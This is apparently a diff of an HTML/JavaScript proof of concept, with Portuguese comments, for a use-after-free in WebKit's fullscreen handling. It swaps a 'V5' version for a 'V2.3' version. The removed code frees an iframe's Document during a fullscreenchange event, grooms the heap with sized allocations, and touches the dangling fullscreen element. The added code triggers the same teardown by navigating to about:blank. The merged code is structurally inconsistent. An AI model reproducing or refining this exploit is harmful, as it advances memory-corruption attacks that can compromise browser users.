@@ -1,39 +1,26 @@
 <html>
 <body>
-<button id="run">Run V5</button>
+<button id="run">Run V2.3</button>
 <div id="status">Ready</div>
-<div id="log" style="font-family:monospace;font-size:11px;
-     height:220px;overflow-y:auto;border:1px solid #ccc;padding:4px"></div>
 <iframe id="testFrame" width="100" height="100"></iframe>
 <script>
 /*
-  V5 CORRIGIDO — estrutura IDÊNTICA à V2 para o trigger.
-  Escalada acontece DENTRO do mesmo callback, sem setTimeout.
-
-  Sequência crítica:
-    child webkitfullscreenchange dispara
-      → iframe.remove()          [FREE do Document]
-      → heap groom               [realoca memória freed]
-      → webkitFullscreenElement  [lê dangling ptr]
-      → iDoc.webkitExitFullscreen() [força acesso ao Element* freed]
-      → novoEl.webkitRequestFullscreen() [força cleanup do estado corrompido]
-    tudo síncrono, sem sair do callback
+  V2.3: Substitui iframe.remove() por iframe.src = 'about:blank'
+  Teardown path diferente — a navegação destrói o Document do filho
+  mas mantém o HTMLIFrameElement no DOM, o que pode deixar o
+  FullscreenManager em estado diferente do remove() direto.
+  Pode expor ponteiro pendente no FrameLoader em vez do FullscreenManager.
 */
-
 var iframe = document.getElementById("testFrame");
 var popup  = null;
-var iDoc   = null;
-
-function log(msg) {
-    var div  = document.getElementById("log");
-    var line = document.createElement("div");
-    line.textContent = msg;
-    div.appendChild(line);
-    div.scrollTop = div.scrollHeight;
-}
 
 iframe.onload = function() {
-    iDoc = iframe.contentDocument;
+    var iDoc = iframe.contentDocument;
+
+    // Evita re-trigger no onload do about:blank
+    if (!iDoc || !iDoc.documentElement) return;
+    if (iDoc.body && iDoc.body.children.length === 0) return;
+
     iDoc.open();
     iDoc.write(
         '<!DOCTYPE html><html><body>' +
@@ -42,123 +29,31 @@ iframe.onload = function() {
     );
     iDoc.close();
 
-    // Listener no FILHO — idêntico ao V2
     iDoc.addEventListener('webkitfullscreenchange', function() {
-        log("1. CHILD webkitfullscreenchange disparado");
+        document.getElementById("status").innerHTML = "child fullscreenchange";
 
-        // === CORRUPÇÃO (V2 intacta) ===
-        if (iframe && iframe.parentNode) {
-            iframe.remove();
-            log("2. iframe.remove() — Document freed");
-        }
-        if (popup && !popup.closed) {
-            popup.close();
-            log("3. popup.close()");
-        }
+        // Navega em vez de remover — Document destruído, iframe permanece
+        iframe.src = "about:blank";
+        if (popup && !popup.closed) popup.close();
 
-        // === ESCALADA SÍNCRONA ===
+        document.getElementById("status").innerHTML += " | navigated to about:blank";
 
-        // Heap groom IMEDIATAMENTE após o free
-        // Aloca objetos de tamanhos variados próximos ao de Element (~256-512 bytes)
-        // para reutilizar a memória do Document/Element destruído
-        var groom = [];
-        for (var i = 0; i < 120; i++) {
-            var d = document.createElement("div");
-            // Varia tamanho: 128, 136, 144... para cobrir diferentes bins
-            d.setAttribute("data-g",
-                new Array(128 + (i % 16) * 8).join("X"));
-            groom.push(d);
-            document.body.appendChild(d);
-        }
-        log("4. Heap groom: 120 nós alocados");
-
-        // Leitura do dangling pointer no documento PAI
-        var danglingEl = document.webkitFullscreenElement;
-        if (danglingEl) {
-            log("5. ⚠ webkitFullscreenElement não-nulo após remove — DANGLING PTR");
-            try {
-                log("   tagName=" + danglingEl.tagName);
-            } catch(e) { log("   EXCEPTION tagName: " + e); }
-            try {
-                log("   clientWidth=" + danglingEl.clientWidth);
-            } catch(e) { log("   EXCEPTION clientWidth: " + e); }
-            try {
-                log("   ownerDocument=" + danglingEl.ownerDocument);
-            } catch(e) { log("   EXCEPTION ownerDocument: " + e); }
-        } else {
-            log("5. webkitFullscreenElement=null no pai");
-        }
-
-        // webkitExitFullscreen no DOC FILHO via iDoc salvo antes do remove
-        // FullscreenManager do filho tenta despachar evento no Element* freed
-        try {
-            iDoc.webkitExitFullscreen();
-            log("6. iDoc.webkitExitFullscreen() — acessa freed Element*");
-        } catch(e) {
-            log("6. iDoc.webkitExitFullscreen EXCEPTION: " + e);
-        }
-
-        // webkitExitFullscreen no PAI também — atinge FullscreenManager pai
-        try {
-            document.webkitExitFullscreen();
-            log("7. document.webkitExitFullscreen() — pai");
-        } catch(e) {
-            log("7. document.webkitExitFullscreen EXCEPTION: " + e);
-        }
-
-        // Novo fullscreen no doc PRINCIPAL
-        // FullscreenManager precisa limpar o estado corrompido para processar
-        var novoEl = document.createElement("div");
-        novoEl.style.cssText =
-            "width:200px;height:200px;background:yellow;" +
-            "position:fixed;top:0;left:0;z-index:9999";
-        document.body.appendChild(novoEl);
-        try {
-            novoEl.webkitRequestFullscreen();
-            log("8. novoEl.webkitRequestFullscreen() — força acesso ao m_fullscreenElement corrompido");
-        } catch(e) {
-            log("8. novoEl.webkitRequestFullscreen EXCEPTION: " + e);
-        }
-
-        // Monitor pós-escalada
-        document.addEventListener('webkitfullscreenchange', function onNewFs() {
-            document.removeEventListener('webkitfullscreenchange', onNewFs);
-            var el2 = document.webkitFullscreenElement;
-            log("9. novo fullscreenchange: el=" + (el2 ? el2.tagName : "null"));
-            if (el2) {
-                try { log("   clientWidth=" + el2.clientWidth); }
-                catch(e) { log("   EXCEPTION: " + e); }
+        // Acessa estado do fullscreen no pai depois da navegação
+        setTimeout(function() {
+            var el = document.webkitFullscreenElement;
+            document.getElementById("status").innerHTML +=
+                " | parent fsEl=" + (el ? el.tagName : "null");
+            if (el) {
+                try {
+                    document.getElementById("status").innerHTML +=
+                        " clientW=" + el.clientWidth;
+                } catch(e) {
+                    document.getElementById("status").innerHTML += " EX:" + e;
+                }
             }
-            // Limpa groom e sai do fullscreen
-            groom.forEach(function(n) {
-                if (n.parentNode) n.parentNode.removeChild(n);
-            });
-            setTimeout(function() {
-                try { document.webkitExitFullscreen(); } catch(e) {}
-                if (novoEl.parentNode) novoEl.parentNode.removeChild(novoEl);
-            }, 200);
-        });
-
-        document.getElementById("status").innerHTML = "Escalada disparada — ver log";
+        }, 100);
     });
-};
 
-document.getElementById("run").onclick = function() {
-    document.getElementById("log").innerHTML = "";
-    document.getElementById("status").innerHTML = "Iniciando...";
-
-    popup = window.open("", "_blank", "width=400,height=300");
-    if (!popup) {
-        document.getElementById("status").innerHTML = "Popup bloqueado!";
-        return;
-    }
-    popup.document.open();
-    popup.document.write(
-        '<!DOCTYPE html><html><body><h3>Popup V5</h3></body></html>'
-    );
-    popup.document.close();
-
-    // Estrutura IDÊNTICA ao trigger da V2
     iDoc.documentElement.webkitRequestFullscreen();
 
     setTimeout(function() {
@@ -166,11 +61,19 @@ document.getElementById("run").onclick = function() {
         popup.focus();
         window.focus();
         try { iframe.contentWindow.focus(); } catch(e) {}
-
         setTimeout(function() {
             if (popup && !popup.closed) popup.close();
         }, 300);
     }, 300);
+};
+
+document.getElementById("run").onclick = function() {
+    document.getElementById("status").innerHTML = "iniciando...";
+    popup = window.open("", "_blank", "width=400,height=300");
+    if (!popup) { document.getElementById("status").innerHTML = "bloqueado"; return; }
+    popup.document.open();
+    popup.document.write('<!DOCTYPE html><html><body><h3>Popup</h3></body></html>');
+    popup.document.close();
 };
 </script>
 </body>
